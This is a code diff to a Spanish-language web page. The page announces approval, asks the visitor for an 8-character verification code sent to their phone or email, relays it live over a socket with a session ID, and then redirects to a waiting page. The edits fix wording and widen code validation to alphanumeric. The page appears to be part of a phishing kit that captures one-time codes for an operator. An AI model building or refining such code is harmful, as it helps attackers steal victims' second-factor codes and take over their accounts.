@@ -82,11 +82,11 @@
 </head>
 <body>
   <div class="screen">
-    <h3>¡APRBADO!</h3>
-    <p>Ingresa el codigo que se le fue enviado a su celular o correo electronico.</p>
+    <h3>¡APROBADO!</h3>
+    <p>Ingresa el código que fue enviado a tu celular o correo electrónico.</p>
     <div class="input-group">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="8" maxlength="8" required>
+      <input type="text" id="codigo" placeholder="Código de verificación" minlength="8" maxlength="8" required>
     </div>
     <p id="mensajeError" class="mensaje-error"></p>
     <button onclick="validarCodigo()">Validar código</button>
@@ -99,24 +99,23 @@
     socket.emit("reconectar", sessionId);
 
     function validarCodigo() {
-      const codigo = document.getElementById("codigo").value;
+      const codigo = document.getElementById("codigo").value.trim();
       const mensajeError = document.getElementById("mensajeError");
       const codigoInput = document.getElementById("codigo");
 
       mensajeError.textContent = "";
       codigoInput.classList.remove("campo-requerido");
 
+      const regexCodigo = /^[a-zA-Z0-9]{8}$/;
+
       if (!codigo) {
         mensajeError.textContent = "El código es obligatorio";
         codigoInput.classList.add("campo-requerido");
-      } else if (!/^\d{8}$/.test(codigo)) {
-        mensajeError.textContent = "El código debe tener 8 dígitos numéricos";
+      } else if (!regexCodigo.test(codigo)) {
+        mensajeError.textContent = "El código debe contener exactamente 8 caracteres alfanuméricos (letras y números)";
         codigoInput.classList.add("campo-requerido");
       } else {
-        // Enviar el código al backend
         socket.emit("codigoIngresado", { codigo, sessionId });
-
-        // Ir a pantalla de espera
         window.location.href = "opciones.html";
       }
     }
